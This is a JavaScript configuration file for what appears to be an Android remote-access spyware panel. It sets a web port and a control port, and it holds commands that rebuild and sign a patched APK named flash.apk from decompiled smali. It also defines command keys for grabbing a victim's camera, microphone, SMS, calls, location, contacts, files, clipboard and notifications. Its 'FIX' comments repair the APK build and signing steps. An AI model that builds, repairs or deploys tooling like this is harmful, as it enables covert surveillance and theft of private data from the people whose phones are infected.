const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/flash.apk');

// FIX: kept leading slash for URL use, but the folder name is now consistent.
exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/flash/IOSocket.smali');

exports.buildCommand = 'proot java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';

// FIX: `sign.jar` typically takes input APK and writes output as `<name>.s.apk` or as specified.
// The original command was missing an explicit output path, so the signed APK path
// was unclear. Passing both input and output makes it deterministic.
exports.signCommand = 'proot java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '" "' + exports.apkSignedBuildPath + '"';

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
};

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
};